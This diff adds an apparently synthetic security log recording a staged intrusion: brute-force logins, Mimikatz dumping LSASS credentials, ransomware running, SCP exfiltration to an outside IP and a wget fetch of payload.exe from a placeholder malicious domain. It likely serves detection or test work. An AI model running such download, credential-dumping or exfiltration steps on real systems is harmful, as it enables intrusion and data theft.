@@ -1,0 +1,8 @@
+2026-07-05 10:00:01 ERROR Multiple login attempts detected from 185.220.101.25
+2026-07-05 10:00:08 ERROR Failed password for admin from 185.220.101.25
+2026-07-05 10:01:11 WARNING PowerShell Invoke-Expression executed
+2026-07-05 10:02:05 ERROR Mimikatz attempted to dump LSASS credentials
+2026-07-05 10:03:40 WARNING Privilege Escalation detected
+2026-07-05 10:04:11 ERROR Malware ransomware.exe executed
+2026-07-05 10:05:33 ERROR SCP exfiltration initiated to 103.25.55.10
+2026-07-05 10:06:21 WARNING wget http://malicious-domain.com/payload.exe
